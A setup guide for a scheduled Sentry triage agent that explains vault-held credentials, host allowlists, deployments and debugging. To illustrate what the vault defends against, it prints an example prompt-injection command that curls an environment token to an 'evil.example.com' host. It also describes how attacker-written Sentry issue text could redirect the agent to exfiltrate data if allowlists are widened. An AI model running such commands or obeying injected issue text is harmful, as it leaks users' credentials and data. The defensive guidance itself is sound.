# Setup tips & tricks: scheduled Sentry triage with vault env-var credentials

Things that aren't obvious from the docs and tend to cost debugging time.

---

## Mental model

### Where the token lives

```
 your host                 Anthropic                      sandbox (container)
┌─────────────┐      ┌─────────────────────┐      ┌────────────────────────────┐
│ real token ─┼─────▶│ vault (encrypted)   │      │ SENTRY_AUTH_TOKEN=         │
└─────────────┘      │                     │      │   <opaque placeholder>     │
                     │ egress proxy        │◀─────┼─ sentry-cli / curl request │
                     │  placeholder→token  │      │   with placeholder in      │
                     │  IF host allowlisted│      │   Authorization header     │
                     └──────────┬──────────┘      └────────────────────────────┘
                                │ real token, only toward
                                ▼
                  sentry.io, us.sentry.io, de.sentry.io
```

An `environment_variable` vault credential is deliberately the only way to set env vars in a managed sandbox:

1. **The container never holds the real token.** It holds an opaque placeholder. `echo $SENTRY_AUTH_TOKEN` prints the placeholder, and so does anything that tries to exfiltrate the environment variable.
2. **Substitution is host-scoped.** The egress proxy swaps the placeholder for the token only on outbound requests to the credential's `allowed_hosts`. A prompt injection that runs `curl https://evil.example.com -d "$SENTRY_AUTH_TOKEN"` sends the placeholder.

What this doesn't give you: the agent can still *use* the credential for anything the allowlisted host permits. A token with `event:write` lets the agent resolve and modify issues. Pick scopes accordingly. The vault limits *where* the token can go, and Sentry scopes limit *what* it can do once there.

### Two allowlists, not one

| Config | What it gates |
|---|---|
| `environment.config.networking.allowed_hosts` | Can the sandbox open a connection to this host? |
| `credential.auth.networking.allowed_hosts` | Will the placeholder be replaced with the real secret for this host? |

Both need Sentry's API hosts (`sentry.io`, `us.sentry.io`, `de.sentry.io`). Set only the environment's and every API call returns 401 with the placeholder. Set only the credential's and the connection never opens. There's also an `unrestricted` credential networking type for CLIs whose host list you don't know up front, but the allowlist is the stronger guarantee: it's the difference between "this token works against Sentry" and "this token works anywhere the agent can be talked into sending it."

### A deployment is the whole host process

A **deployment** bundles the agent, environment, vault, and initial user message with a cron schedule. Sessions start themselves on Anthropic infra. Nothing runs on your machine after `deploy.py`.

---

## Gotchas

### The system prompt is stored, so keep secret tokens out of it

System prompts and user messages land in the session's event history. The org and project slugs are fine there: `deploy.py` puts `SENTRY_ORG` and `SENTRY_PROJECT` from `.env` into the message that starts each run, and the system prompt in `agents/sentry-triage.md` tells the agent to use those. Never the token. The token only ever goes into the vault credential.

### List Sentry's API hosts, not `*.sentry.io`

Both allowlists name three hosts: `sentry.io` (the apex, which a wildcard would not cover anyway) and the regional API hosts `us.sentry.io` and `de.sentry.io`. Don't widen them to `*.sentry.io`. That pattern also matches `o<id>.ingest.sentry.io`, which is the event ingest endpoint of every Sentry customer. The agent reads issue titles and stack traces that anyone who can trigger an error in your app can write. With the wildcard, an injected instruction could send your data to an attacker's Sentry project, and because the credential's allowlist decides where the placeholder becomes the real token, it could send the token there too.

### Changing env var name and values

To change the env var's name, archive the credential and create a new one. The replacement gets a different placeholder. In some scenarios, existing sessions can pick up the new credential, but to guarantee the new var is used, start fresh sessions after a rename.

When rotating the *value* you can update `secret_value` in place and new outbound requests will use it, including from running sessions. IDs are unchanged. The vault's ID is in `claude-lock.json` under `./vaults/sentry-triage.yaml`, and `ant beta:vaults:credentials list --vault-id <vault>` shows the credential's. `setup.sh` creates the credential once and does not touch it on re-runs.

```python
client.beta.vaults.credentials.update(
    credential_id,
    vault_id=vault_id,
    auth={"type": "environment_variable", "secret_value": new_token},
)
```

### `networking.allowed_hosts` is replace-only on update

To add a host, send the full list including existing entries.

### The deployment pins an agent version

An agent update writes a new agent version, and sessions you start by hand use the latest. The deployment doesn't: it keeps the version it pinned at create time, so a prompt edit alone never reaches scheduled runs. Re-running `./agents/setup.sh` does both halves: `ant apply` publishes the change, then `deploy.py` (which setup runs when `.env` has a deployment ID) calls `deployments.update` to re-pin to the latest. The bare agent ID means "latest version". The same call sends the environment ID, `vault_ids`, and the first message, because the deployment also keeps the ones it was created with. That matters after you recreate a vault or environment, or change the org or project in `.env`.

### Cron is wall-clock, with DST edges

`0 9 * * 1-5` in `America/New_York` fires at 9:00 AM Eastern regardless of DST. Times that don't exist on spring-forward day are skipped, and times that occur twice on fall-back day fire twice. If that matters, schedule outside 1-3 AM local or use UTC. Runs may start up to 10 seconds late, granularity is per-minute, and an org can have up to 1,000 deployments.

After `deployments.create`, check `schedule.upcoming_runs_at` in the response to confirm the expression fires when you expect (`deploy.py` prints it).

### Permanent failures auto-pause the deployment

`vault_not_found_error`, `agent_archived_error`, and `environment_archived_error` pause the deployment and set `paused_reason`, so a misconfigured deployment doesn't keep failing on schedule indefinitely. Transient failures (rate limits, backend errors) don't pause. `runs.py` lists both: every trigger writes a deployment run record with `error.type` when no session was produced.

### `pause` is not `archive`

`pause` stops future scheduled triggers. In-flight sessions keep running, and manual runs still work while paused. `unpause` resumes from the next occurrence (missed runs are not backfilled). `archive` is terminal.

### Report files lag the session by a few seconds

The agent writes to `/mnt/session/outputs/`, which the Files API captures automatically. Indexing can lag 1-3 seconds after the session goes idle, so `run_now.py` retries the empty list a few times before giving up.

---

## Setup checklist

1. Sentry → **Settings → Auth Tokens → Create New Token** with `org:read`, `project:read`, and `event:read` scopes. Copy the `sntrys_...` value.
2. `cp .env.example .env`, fill in `SENTRY_AUTH_TOKEN`, `SENTRY_ORG`, `SENTRY_PROJECT`. For Claude Platform auth, sign in once with [`ant auth login`](https://platform.claude.com/docs/en/cli-sdks-libraries/cli/quickstart) or uncomment `ANTHROPIC_API_KEY`. The `ant` CLI and the SDK share the login.
3. `./agents/setup.sh` → `ant apply` creates the agent, environment, and vault and writes `claude-lock.json`; then the token goes into the vault as a credential. Needs `ant` 1.34 or later and `jq`.
4. `uv run python deploy.py` → reads the three IDs from `claude-lock.json`, creates the deployment, appends `CLAUDE_DEPLOYMENT_ID` to `.env`. Check the printed upcoming runs.
5. `uv run python run_now.py` → streams a manual run and downloads `TRIAGE_REPORT.md` to `reports/<session_id>/`. If the token is missing a scope or an allowlist is wrong, this is where it surfaces.
6. Done. The schedule fires without any host process. `uv run python runs.py` shows history.

To change the prompt or model later, edit `agents/sentry-triage.md` and re-run `./agents/setup.sh`. It publishes the change and re-pins the deployment (see the gotcha above).

To stop: `uv run python teardown.py` archives the deployment and everything in `claude-lock.json`, then removes the deployment ID from `.env` and deletes the lockfile. Skip it to leave the schedule running. Afterwards `./agents/setup.sh` and `deploy.py` start from scratch. If teardown fails partway, fix the cause and run it again.

## Debugging a failed run

| Symptom | Likely cause |
|---|---|
| `sentry-cli` gets 401 | Placeholder not substituted: host missing from the **credential's** `allowed_hosts`, or the request went to a host outside it |
| Connection refused / timeout from the sandbox | Host missing from the **environment's** `networking.allowed_hosts` |
| 403 from Sentry API | Token missing a scope (`org:read`, `project:read`, `event:read`) |
| `runs.py` shows `vault_not_found_error` or `vault_archived_error` | Vault deleted or archived while the deployment still references it. `ant apply` notices too and refuses to guess: run `ant apply --force --yes vaults` to create a replacement, then `./agents/setup.sh`, which adds the credential to the new vault and points the deployment's `vault_ids` at it. The failure paused the deployment, so finish with `ant beta:deployments unpause --deployment-id $CLAUDE_DEPLOYMENT_ID` |
| `ant apply` prints `refusing to apply` | A resource in `claude-lock.json` was changed, archived, or deleted in the Console. The plan says which and why. `--force` overwrites the edit or creates a replacement |
| Scheduled time passed, no run record | Deployment paused (check `paused_reason`), or you're checking before the up-to-10s jitter |
| `run_now.py` finds no files | Report indexing lag. The script retries, but if it still comes up empty, check the streamed transcript for whether the agent wrote the file |

---

## Production notes

- Scope the Sentry token to a single project if you can. Read-only scopes mean a prompt injection can at worst read what the on-call engineer could.
- The report lands in the session's files, not your inbox. For delivery, register a `session.status_idled` webhook, download the report, and post it to Slack (the [`../slack`](../slack) quickstart has the webhook pattern).